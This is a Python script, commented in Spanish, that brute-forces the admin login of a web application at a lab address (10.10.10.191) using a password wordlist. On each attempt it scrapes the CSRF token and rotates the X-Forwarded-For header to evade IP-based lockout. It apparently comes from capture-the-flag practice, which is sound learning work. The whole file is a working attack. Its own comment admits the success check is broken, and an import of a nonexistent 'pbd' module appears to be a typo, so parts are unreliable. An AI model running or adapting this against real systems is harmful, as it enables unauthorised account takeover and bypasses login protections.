#!/usr/bin/python3


import sys
import time
import requests
import signal
import re
import pbd

from pwn import *

def def_handler(sig, frame):
        print("\n[*] Saliendo . . .\n")
        sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

#Variable Global
main_url = "http://10.10.10.191/admin/"


def makeRequest():
# peticion s que almacena la session(Cookies, etc)
        s = requests.session()

# Creamos la variable f que nos abra el archivo diccionario en modo read
        f = open("diccionario.txt", "r")
# Barras de Progreso
        p1 = log.progress("Fuerza bruta")
        p1.status("Iniciando Ataque de Fuerza Bruta")
        time.sleep(2)

# Creando el bucle para realizar fuerza bruta
        for password in f.readlines():

# Pillando el tokenCSRF con la libreria RE y usando expresiones regulares para filtrar por la data de "value=", a niver de la respuesta de la peticion response
                response = s.get(main_url)
                tokenCSRF = re.findall(r'name="tokenCSRF" value="(.*?)"', response.text)[0]

# Campo del login, Data que tramitamos
                data_post = {
                'tokenCSRF' : tokenCSRF,
                'username' : 'fergus',
                'password' : '%s' % password.strip('\n')
# Fuerza bruta en la password
                }

# Usamos estos headers para saltarnos las restricciones de IP Block a nivel web
                headers_login = {

                'User-Agent' : 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Referer' : 'http://10.10.10.191/admin/login',
                'X-Forwarded-For' : '%s' % password.strip('\n')
                }

# Barra de progreso de peticions * passwords
                p1.status("Probando con la password %s" % password.strip('\n'))

# Variable r que es la peticcion HTTP via POST y tramita con los siguientes argumentos
                r = s.post(main_url, data=data_post, headers=headers_login)

# Comprobacion de password correcta
# No nos funciona esta parte de comprobacion !! 
                if "Username or password incorrect" not in r.text:
                        p1.success("La password es %s" % password.strip('\n'))
                        sys.exit(0)

if __name__ == '__main__':

        makeRequest()

